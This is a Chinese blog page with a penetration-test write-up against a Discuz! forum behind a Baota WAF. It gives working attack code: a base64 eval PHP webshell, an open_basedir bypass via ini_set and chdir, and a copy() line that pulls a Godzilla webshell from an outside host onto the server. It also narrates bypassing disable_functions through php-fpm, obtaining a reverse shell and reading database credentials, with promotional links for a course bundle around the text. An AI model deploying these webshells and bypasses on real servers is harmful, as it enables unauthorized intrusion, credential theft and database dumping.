<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>网络安全：绕过 MSF 的一次渗透测试 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="网络安全：绕过 MSF 的一次渗透测试" />
<meta property="og:description" content="这次渗透的主站是 一个 Discuz!3.4 的搭建 违法招 piao 网站， 配置有宝塔 WAF
用 Discuz!ML 3.X 的漏洞进行攻击，但是没有成功
发现主站外链会有一个发卡网，引导人们来这充值，是 某某发卡网，而且域名指向也是主站的 ip，两个网站在同一个 ，此处忘记截图了
网上有通杀 payload，写 shell 的过程在这里省略了
【如果你对网络安全入门感兴趣，那么你需要的话可以点击这里👉网络安全重磅福利：入门&amp;进阶全套282G学习资源包免费分享！】
1、网络安全学习路线
2、电子书籍（白帽子）
3、安全大厂内部视频
4、100 份 src 文档
5、常见安全面试题
6、ctf 大赛经典题目解析
7、全套工具包 8、应急响应笔记
由于网站存在宝塔 WAF ，写入 shell 必须变形一下，将命令进行 base64 编码在传进去
&lt;?php @eval(base64_decode($_POST[&#39;yanshu&#39;]));?&gt; 在 phpinfo()里可以看到，宝塔默认会设置 open_basedir 以及 disable_functions，导致蚁剑的 shell 直接连接之后不大好用，命令执行不了
绕过 open_basedir 查看文件 利用 ini_set() 来 bypass open_basedir 来获取路径名和目录内容，base64 编码之后执行，发现宝塔目录下还有其他站点目录
`eval(&#34;mkdir(&#39;1&#39;);chdir(&#39;1&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&#39;/www/wwwroot&#39;));&#34;);` 哥斯拉管理 webshell 为了方便查看文件 ，使用哥斯拉马，加密器选择 PHP_EVAL_XOR_BASE64，用 copy 命令传到服务器中，这样流量就可以不会被宝塔 waf 拦截了" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/76bff451d4bad7e7fe817aafa4e60400/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-17T17:02:51+08:00" />
<meta property="article:modified_time" content="2024-01-17T17:02:51+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">网络安全：绕过 MSF 的一次渗透测试</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>这次渗透的主站是 一个 Discuz!3.4 的搭建 违法招 piao 网站， 配置有宝塔 WAF</p> 
<p><img src="https://images2.imgbox.com/3c/65/ihuVa08z_o.png" alt=""></p> 
<p>用 Discuz!ML 3.X 的漏洞进行攻击，但是没有成功</p> 
<p><img src="https://images2.imgbox.com/5b/85/nY89xGtq_o.png" alt=""></p> 
<p>发现主站外链会有一个发卡网，引导人们来这充值，是 某某发卡网，而且域名指向也是主站的 ip，两个网站在同一个 ，此处忘记截图了</p> 
<p>网上有通杀 payload，写 shell 的过程在这里省略了</p> 
<p><img src="https://images2.imgbox.com/d5/22/UpIoCZud_o.png" alt=""></p> 
<blockquote> 
 <p>【如果你对网络安全入门感兴趣，那么你需要的话可以点击这里<strong>👉</strong><a href="https://mp.weixin.qq.com/s/BWb9OzaB-gVGVpkm161PMw" rel="nofollow">网络安全重磅福利：入门&amp;进阶全套282G学习资源包免费分享！</a>】</p> 
 <p>1、网络安全学习路线</p> 
 <p>2、电子书籍（白帽子）</p> 
 <p>3、安全大厂内部视频</p> 
 <p>4、100 份 src 文档</p> 
 <p>5、常见安全面试题</p> 
 <p>6、ctf 大赛经典题目解析</p> 
 <p>7、全套工具包 8、应急响应笔记</p> 
</blockquote> 
<p>由于网站存在宝塔 WAF ，写入 shell 必须变形一下，将命令进行 base64 编码在传进去</p> 
<pre><code>&lt;?php @eval(base64_decode($_POST['yanshu']));?&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/b1/37/ADDkebhm_o.png" alt=""></p> 
<p>在 phpinfo()里可以看到，宝塔默认会设置 open_basedir 以及 disable_functions，导致蚁剑的 shell 直接连接之后不大好用，命令执行不了</p> 
<h4><a id="_open_basedir__42"></a>绕过 open_basedir 查看文件</h4> 
<p>利用 ini_set() 来 bypass open_basedir 来获取路径名和目录内容，base64 编码之后执行，发现宝塔目录下还有其他站点目录</p> 
<pre><code>`eval("mkdir('1');chdir('1');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/www/wwwroot'));");`

</code></pre> 
<p><img src="https://images2.imgbox.com/82/23/izUYe5IZ_o.png" alt=""></p> 
<h4><a id="_webshell_53"></a>哥斯拉管理 webshell</h4> 
<p>为了方便查看文件 ，使用哥斯拉马，加密器选择 PHP_EVAL_XOR_BASE64，用 copy 命令传到服务器中，这样流量就可以不会被宝塔 waf 拦截了</p> 
<pre><code>copy('http://xxxx/g.php','/www/wwwroot/xxx.com/g.php');
</code></pre> 
<p><img src="https://images2.imgbox.com/36/92/thDuZF0r_o.png" alt=""></p> 
<p>哥斯拉马可以自动实现 bypass openbase_dir ，读取数据库 用户名密码，可以更改管理员用户进后台或者脱库</p> 
<p><img src="https://images2.imgbox.com/88/a2/CvYibtQZ_o.png" alt=""></p> 
<p><img src="https://images2.imgbox.com/94/5e/5aXk9yYq_o.png" alt=""></p> 
<h4><a id="_disable_functions__69"></a>绕过 disable_functions 执行命令</h4> 
<p>disable_functions 禁用了 putenv()、mail() 、pcntl_exec() 等函数，环境是 php5.6，导致很多常规 bypass 的方法都用不了</p> 
<p><img src="https://images2.imgbox.com/2a/2c/MmQYUBSR_o.png" alt=""></p> 
<p>网站是使用 nginx+php5.6 ，用攻击 php-fpm 的办法来 bypass，攻击原理可以看 参考链接</p> 
<p>先找到 php-fpm 的配置 如：/www/server/php/56/etc/php-fpm.conf</p> 
<p><img src="https://images2.imgbox.com/ac/2e/wxrFKfZ1_o.png" alt=""></p> 
<p>或者看 nginx 的配置 ，得到 php-fpm 的位置 unix:/tmp/php-cgi-56.sock</p> 
<p><img src="https://images2.imgbox.com/b4/12/0KEkPcvt_o.png" alt=""></p> 
<p>首先 选择 PAttackFPM 将模块加载并执行</p> 
<p><img src="https://images2.imgbox.com/5b/9d/vUVDpIxq_o.png" alt=""></p> 
<p>再利用哥斯拉马中 bypass disable_functions 的模块 ，成功执行命令</p> 
<p><img src="https://images2.imgbox.com/2f/11/HA5rZH8N_o.png" alt=""></p> 
<p>获取反弹 shell ，可以进一步尝试对主机进行提权了</p> 
<p><img src="https://images2.imgbox.com/32/71/ArFBjkFh_o.png" alt=""></p> 
<h2><a id="_97"></a>学习计划安排</h2> 
<p><img src="https://images2.imgbox.com/8c/ad/CpJVSsqs_o.png" alt=""><br> 我一共划分了六个阶段，但并不是说你得学完全部才能上手工作，对于一些初级岗位，学到第三四个阶段就足矣~</p> 
<p>这里我整合并且整理成了一份【282G】的网络安全从零基础入门到进阶资料包，需要的小伙伴可以扫描下方CSDN官方合作二维码免费领取哦，无偿分享！！！</p> 
<p>如果你对网络安全入门感兴趣，那么你需要的话可以</p> 
<p>点击这里<strong>👉</strong><a href="https://mp.weixin.qq.com/s/BWb9OzaB-gVGVpkm161PMw" rel="nofollow">网络安全重磅福利：入门&amp;进阶全套282G学习资源包免费分享！</a></p> 
<p>①网络安全学习路线<br> ②上百份渗透测试电子书<br> ③安全攻防357页笔记<br> ④50份安全攻防面试指南<br> ⑤安全红队渗透工具包<br> ⑥HW护网行动经验总结<br> ⑦100个漏洞实战案例<br> ⑧安全大厂内部视频资源<br> ⑨历年CTF夺旗赛题解析</p> 
<img src="https://images2.imgbox.com/d9/d2/f3t7jnMM_o.jpg">
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/df53f6993252fc9bdfea0001ddec3bbc/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">为什么 macOS 比 Windows 稳定？</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/acf415f4ab4f2e2907d60eaf8537d922/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">如何进行产品的人机交互设计？</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>